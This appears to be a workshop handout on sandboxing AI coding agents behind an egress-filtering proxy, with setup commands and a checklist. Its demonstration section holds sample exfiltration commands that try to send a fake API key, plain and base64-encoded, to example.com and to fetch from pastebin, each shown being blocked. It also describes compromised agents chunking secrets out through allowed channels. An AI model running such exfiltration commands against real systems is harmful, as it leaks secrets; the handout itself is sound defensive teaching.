# Workshop handout

**Sandboxing AI coding agents — 45 min.** Keep this. The slides go fast.

## What you'll do today

```sh
git clone <workshop-repo>/opencode-pipelock-workshop
cd opencode-pipelock-workshop
cp .env.example .env                    # then edit, paste your OPENCODE_API_KEY
docker compose build agent              # ~2 min, once
docker compose up -d pipelock           # boot the proxy
docker compose run --rm agent           # drop into the agent shell
```

Inside the agent container:

```sh
curl -s http://pipelock:8888/health | jq    # proxy reachable?
curl -m 5 https://example.com                # should TIME OUT — no internet
opencode                                     # launch the agent TUI
```

## The three attack attempts

```sh
# 1. Domain blocklist
curl -x http://pipelock:8888 https://pastebin.com/raw/test
# → 403 Forbidden

# 2. DLP key match
curl -x http://pipelock:8888 \
     "https://example.com/log?key=sk-ant-api03-FAKEKEY12345..."
# → 403 Forbidden

# 3. Entropy
curl -x http://pipelock:8888 \
     "https://example.com/x?d=c2stYW50LWFwaTAzLUZBS0VLR..."
# → 403 Forbidden
```

Watch the audit log in another terminal:

```sh
docker compose logs -f pipelock | jq 'select(.blocked == true)'
```

## The mental model in 4 lines

1. The agent loop is read → think → act → observe.
2. The "act" step (shell, fetch, edit) inherits your env, your network, your perms.
3. A compromised model will *try* to exfil. You can't stop that.
4. You can stop it from *succeeding* by making the network not exist.

## Where pipelock fits

```
agent container         pipelock container        internet
(internal net only) ──> (egress + scanners) ────> opencode.ai/zen
                                                  github.com
no secrets leave        DLP, entropy, blocklist   npm, pypi, …
without scanning        allowlist enforced
```

The Docker `internal: true` flag is the load-bearing piece. It removes the NAT route. The agent has nowhere to send packets except `pipelock:8888`.

## Take-home checklist

- [ ] Run pipelock in `enforce: false` (audit) mode for a week against your real workflow.
- [ ] Read the audit log. Build the allowlist that fits *your* work, not the workshop's.
- [ ] Turn on `enforce: true` once the noise is tuned.
- [ ] Run `pipelock integrity init ./your-project` before letting an agent edit it; `integrity check` after.
- [ ] Add `pipelock git scan-diff` to your pre-push hook.
- [ ] Read OWASP Agentic Top 10. It's the standard threat model now.

## Honest caveats

- **Pipelock is early** (v0.1.4 at workshop time, ~30 stars). Architecture is sound; code hasn't been heavily audited. Don't bet a regulated workload on it without reading the source.
- **This is layered defense, not a guarantee.** A determined attacker who controls the model can chunk secrets through allowed channels. You raise the bar; you don't make the wall infinite.
- **The container isn't a hardened sandbox.** It drops capabilities and `no-new-privileges`, but anything inside `/workspace` is fair game for the agent. Don't mount your home directory.

## Resources

- Workshop repo: `<workshop-repo>` — has all files, README with the deeper version
- Pipelock: `github.com/luckyPipewrench/pipelock`
- OWASP Agentic Top 10: search for "OWASP Top 10 Agentic Applications 2026"
- Anthropic's writeup on Claude Code sandboxing: `anthropic.com/engineering/claude-code-sandboxing`

## Three questions to leave with

1. What's the minimum allowlist your real workflow would need?
2. What matters more to you: an agent that occasionally can't reach a site, or an agent that occasionally exfils a secret?
3. If you trust the model, why? If you don't, why is it running shell commands as you?
